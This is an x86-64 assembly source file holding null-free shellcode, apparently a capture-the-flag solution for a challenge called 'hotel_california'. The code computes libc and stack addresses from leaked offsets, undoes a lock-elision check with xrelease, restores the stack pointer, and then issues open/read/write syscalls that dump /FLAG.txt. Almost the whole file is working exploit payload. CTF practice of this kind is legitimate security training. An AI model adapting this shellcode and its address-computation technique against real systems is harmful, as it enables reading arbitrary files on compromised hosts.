; non-null shellcode for hotel_california
;   Note:  apparently `rel $` is `rip - (sizeof instr)`
bits 64
global    _start

section   .text
_start:
    jmp escape
    db 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
escape:
    ; get libc address from heap offset
    mov rbx,[rel $ -0x18]

    ; calculate environ stack pointer from libc
    sub rbx,-0x23f8
    mov rdx, [rbx]

    ; get first random number from the stack
    mov edx, [rdx-0x584]

    ; load original [rdi] address
    lea rdi, [rel $ -0x87]

    ; end lock elision on [rdi] by storing the original random value
    xrelease mov [rdi], edx

    ; fix up the stack
    mov rsp,[rbx]
    add rsp, -0x18888

shellcode:
    ; "cat /FLAG.txt" shellcode from team mate
    push 0x74
    mov rax, 0x78742e47414c462f
    push rax
    mov rdi, rsp
    push 1
    pop rdx
    xor esi, esi
    push 2
    pop rax
    syscall
    mov rdi, rax
    xor eax, eax
    mov rsi, rsp
    push 0x7f
    pop rdx
    syscall
    mov rdx, rax
    push 1
    pop rax
    mov rdi, rax
    syscall
